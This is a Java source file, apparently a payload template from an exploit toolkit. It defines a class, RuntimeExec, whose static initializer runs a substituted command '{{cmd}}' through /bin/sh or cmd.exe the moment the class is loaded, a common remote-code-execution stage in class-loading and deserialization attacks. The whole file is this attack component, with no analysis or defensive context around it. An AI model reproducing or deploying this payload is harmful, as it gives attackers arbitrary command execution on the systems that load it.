package payload;
import java.io.File;
import java.io.IOException;

public class RuntimeExec {
    static {
        String cmd = "{{cmd}}";
        String[] var1;
        if (File.separator.equals("/")) {
            var1 = new String[]{"/bin/sh", "-c", cmd};
        } else {
            var1 = new String[]{"cmd", "/C", cmd};
        }
        try {
            Runtime.getRuntime().exec(var1);
        } catch (IOException var3) {
            var3.printStackTrace();
        }
    }
}
